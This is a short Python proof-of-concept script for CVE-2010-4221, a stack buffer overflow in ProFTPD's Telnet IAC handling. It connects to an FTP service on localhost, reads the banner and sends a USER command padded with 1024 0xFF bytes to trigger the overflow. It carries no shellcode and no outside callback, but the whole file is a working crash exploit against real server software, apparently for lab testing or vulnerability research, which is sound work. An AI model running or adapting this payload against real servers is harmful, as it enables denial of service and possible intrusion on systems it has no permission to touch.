#!/usr/bin/env python3
"""
PoC: CVE-2010-4221 - ProFTPD Telnet IAC Stack Buffer Overflow
Trigger: Send >512 Telnet IAC (0xFF) bytes to overflow stack buffer in pr_netio_telnet_gets
"""

import socket

s = socket.socket()
s.connect(("localhost", 2127))
s.recv(1024)  # banner

# CVE-2010-4221: pr_netio_telnet_gets has improper IAC (0xFF) byte counting
# Sending many IAC bytes triggers stack buffer overflow
payload = b"USER " + b"\xff" * 1024 + b"\r\n"
s.send(payload)
s.close()
